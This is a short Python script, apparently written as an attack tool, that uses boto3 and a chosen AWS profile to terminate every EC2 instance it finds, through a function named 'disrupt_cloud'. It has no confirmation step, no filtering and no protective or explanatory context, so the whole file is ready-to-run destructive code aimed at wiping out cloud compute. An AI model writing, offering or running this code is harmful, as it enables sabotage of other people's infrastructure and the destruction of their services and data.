import boto3
import sys

def disrupt_cloud(profile):
    session = boto3.Session(profile_name=profile)
    ec2 = session.client('ec2')
    response = ec2.describe_instances()
    for reservation in response['Reservations']:
        for instance in reservation['Instances']:
            ec2.terminate_instances(InstanceIds=[instance['InstanceId']])
            print(f"Terminated instance {instance['InstanceId']}")

def main():
    profile = input("Enter AWS profile: ")
    disrupt_cloud(profile)

if __name__ == "__main__":
    main()
